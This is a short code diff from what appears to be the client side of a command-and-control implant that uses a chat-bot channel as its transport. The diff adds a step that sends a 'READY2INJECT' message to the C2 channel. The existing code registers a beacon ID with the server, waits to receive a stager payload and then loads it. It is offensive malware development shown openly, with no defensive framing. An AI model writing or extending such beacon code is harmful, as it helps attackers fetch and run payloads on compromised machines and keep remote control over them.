@@ -111,6 +111,13 @@ async def go():
     # Register beaconId so C2 server knows we're waiting
     await registerClient()
     print("Waiting for stager...")  # DEBUG
+
+    # Send READY2INJECT message to indicate readiness
+    channel = client.get_channel(CHANNEL_ID)
+    await channel.send("READY2INJECT")  # Notify the server that we are ready
+    print("Sent READY2INJECT message to the server.")
+
+    # Wait for stager data
     p = await recvData()
     p = p[0]
     print("Got a stager! loading...")
